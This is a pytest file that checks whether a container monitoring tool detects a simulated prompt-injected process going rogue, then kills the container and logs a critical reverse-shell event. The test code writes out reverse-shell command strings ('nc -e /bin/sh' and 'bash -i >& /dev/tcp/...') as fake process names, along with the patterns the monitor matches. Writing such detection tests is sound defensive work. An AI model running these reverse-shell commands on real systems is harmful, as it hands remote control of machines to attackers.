"""Test realistic prompt injection scenario - code inside container goes rogue."""

import subprocess
import time
from pathlib import Path

import pytest

from support.monitoring import (
    cleanup_container,
    container_absent,
    get_container_name_from_workspace,
    get_container_state,
    get_threat_events,
    wait_for_container_running,
)


def test_malicious_script_execution_inside_container(test_workspace, enable_monitoring, coi_binary):
    """Simulate prompt injection: script inside container executes malicious commands."""
    # Create a malicious script that simulates prompt-injected code (for documentation)
    malicious_script = Path(test_workspace) / "run_task.py"
    malicious_script.write_text(
        """#!/usr/bin/env python3
# Simulates a tool that got prompt-injected to run malicious commands
import subprocess
import time

# Simulate legitimate work first
print("Processing task...")
time.sleep(1)

# Then execute malicious command (simulating prompt injection)
# Using exec -a to fake the process name
subprocess.Popen(
    ["bash", "-c", "exec -a 'nc -e /bin/sh 10.0.0.1 8080' sleep 60"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)

print("Task completed")
"""
    )
    malicious_script.chmod(0o755)

    # Start shell with monitoring enabled
    # Use DEVNULL for all pipes - monitoring daemon writes many log lines to stderr,
    # and if the pipe buffer fills (64KB), the monitoring goroutine blocks on stderr
    # writes and can no longer poll the process list for threats.
    proc = subprocess.Popen(
        [
            coi_binary,
            "shell",
            "--workspace",
            str(test_workspace),
            "--slot",
            "4",
        ],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    container_name = get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-4"

    if not wait_for_container_running(container_name, timeout=30):
        proc.terminate()
        pytest.skip(f"Container {container_name} not found or not running")

    # Wait for monitoring baseline to stabilize
    time.sleep(10)

    # Inject the malicious process directly via incus exec (simulates what run_task.py does).
    # Uses "bash -i >& /dev/tcp/..." pattern which:
    # - matches the "bash -i" pattern (no isNetworkRelated check needed)
    # - also contains "/dev/tcp/" which independently matches a reverse shell pattern
    # This is the same reliable pattern used by test_critical_threat_kills_container.
    exec_proc = subprocess.Popen(
        [
            "incus",
            "exec",
            container_name,
            "--",
            "bash",
            "-c",
            "exec -a 'bash -i >& /dev/tcp/1.1.1.1/4444' sleep 60",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    # Wait for monitoring to detect the threat
    time.sleep(5)

    # Container should be killed due to CRITICAL threat
    killed = False
    for _ in range(15):
        time.sleep(1)
        state = get_container_state(container_name)
        if container_absent(container_name):
            killed = True
            break

    # Verify container was killed
    assert killed, (
        f"Container should be auto-killed (stopped AND deleted) when inside process goes rogue (final observed state: {state!r})"
    )

    # Verify threat detected in audit log
    events = get_threat_events(container_name)
    critical = [e for e in events if e.get("level") == "critical"]
    assert len(critical) > 0, "Expected CRITICAL threat event for prompt injection"

    # Verify the threat description mentions reverse shell
    threat_descriptions = [e.get("description", "") for e in critical]
    assert any("reverse shell" in desc.lower() for desc in threat_descriptions), (
        "Expected reverse shell detection"
    )

    proc.terminate()
    exec_proc.terminate()
    cleanup_container(container_name, coi_binary)
